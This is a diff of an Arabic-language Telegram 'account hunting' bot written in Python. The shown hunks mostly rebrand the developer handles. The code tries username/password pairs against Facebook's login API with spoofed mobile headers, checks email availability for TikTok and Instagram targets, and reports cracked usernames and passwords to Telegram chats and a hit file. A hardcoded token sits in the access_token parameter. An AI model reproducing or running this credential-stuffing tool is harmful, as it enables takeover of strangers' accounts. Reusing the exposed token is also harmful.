@@ -49,7 +49,7 @@ def start(message):
 			booton5=types.InlineKeyboardButton(text=' حسابات فيسبوك',callback_data='click4')
 			booton2=types.InlineKeyboardButton(text='قناتي',url="https://t.me/AR1R1")
 			keyboard.add(booton5,booton3,booton1,booton4,booton2)
-			bot.reply_to(message,'اهلا بك في بوت صيد حسابات \nTele =>@AR1R1',reply_markup=keyboard)	
+			bot.reply_to(message,'اهلا بك في بوت صيد حسابات \nTele =>@Q_o_e',reply_markup=keyboard)	
 		
 @bot.callback_query_handler(func=lambda call: True)
 def callback_data(call):
@@ -88,7 +88,7 @@ def callback_data(message,call):
 					zz+=1
 					with open('hit.txt', 'a') as (HACKED):
 						HACKED.write(f"متاح \nالايميل =>>({email})\n")
-					igg=(f"‹ Available Email TikTok  ✓\n𖣔𝒇𝒂𝒓3𝒐𝒏 𖣔\n‹ Email : {email}\n𖣔𝒇𝒂𝒓3𝒐𝒏 𖣔\n• @ffgg11223344")
+					igg=(f"‹ Available Email TikTok  ✓\n𖣔𝒇𝒂𝒓3𝒐𝒏 𖣔\n‹ Email : {email}\n𖣔𝒇𝒂𝒓3𝒐𝒏 𖣔\n• @c_p_8")
 					bot.send_message(message.chat.id,igg)
 					bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
 				else:
@@ -137,7 +137,7 @@ def cal1(message,call):
 				        id = str(req_id['graphql']['user']['id'])
 				        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
 				        following = str(req_id['graphql']['user']['edge_follow']['count'])
-				        joo3 = f" المهيب \n صـــدلَكَ حً ـًسًــــــــآبّـــــــ \n ︎\n .. الاسـم   : {name}\n .اليوزر: {userQ}\n .. الرمز  : {password}\n .. المتابعين : {followes}\n .. المتابعهم : {following}\n .. تاريـخ : \n .. الوقت : \n\n ︎.<•>︎  المطور ~~~~ @zzzlt.\n..   :@zzzlt"
+				        joo3 = f" المهيب \n صـــدلَكَ حً ـًسًــــــــآبّـــــــ \n ︎\n .. الاسـم   : {name}\n .اليوزر: {userQ}\n .. الرمز  : {password}\n .. المتابعين : {followes}\n .. المتابعهم : {following}\n .. تاريـخ : \n .. الوقت : \n\n ︎.<•>︎  المطور ~~~~ @zzzlt.\n..   :@Q_o_e"
 				        bot.send_message(call.message.chat.id,joo3) 
 					        
 					        
@@ -189,7 +189,7 @@ def check(message,call):
 	    user_agent = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 	    headers = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 	    params = {
-	    'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
+	    'access_token': '5547766400:AAHYlGhijrp6jlwn3C5zKv4xX4KqsPrdLok', 
 	    'format': 'JSON', 
 	    'sdk_version': '2', 
 	    'email': username, 
@@ -201,7 +201,7 @@ def check(message,call):
 	    api = 'https://b-api.facebook.com/method/auth.login'
 	    response = requests.get(api, params=params, headers=headers)
 	    if 'access_token' in response.text and 'EAAA' in response.text:
-	        a2=(f"‹ ғᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : {username}\n‹ ᴘᴀѕѕᴡᴏʀᴅ :{password}\n────── • ✧✧ • ──────\n• @NNRN3")
+	        a2=(f"‹ ғᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : {username}\n‹ ᴘᴀѕѕᴡᴏʀᴅ :{password}\n────── • ✧✧ • ──────\n• @Q_o_e")
 	        bot.send_message(call.message.chat.id,a2) 
 	        zz+=1
 	        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
@@ -223,7 +223,7 @@ def tiktok(message,call):
 		       y=requests.get(f"https://sidraapi.pythonanywhere.com/v1/api/check/yahoo/?email={email}").text
 		       if "True" in y:
 		        	zz+=1
-		        	a2=(f"‹ instagram Email True ✓\n────── • ✧✧ • ──────\n‹ Email => (-{email}-)\n────── • ✧✧ ──────\n• @NNRN3")
+		        	a2=(f"‹ instagram Email True ✓\n────── • ✧✧ • ──────\n‹ Email => (-{email}-)\n────── • ✧✧ ──────\n• @Q_o_e")
 		        	bot.send_message(call.message.chat.id,a2)
 		        	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"صيد = {zz}\n خطأ ={aa}")
 		       else:
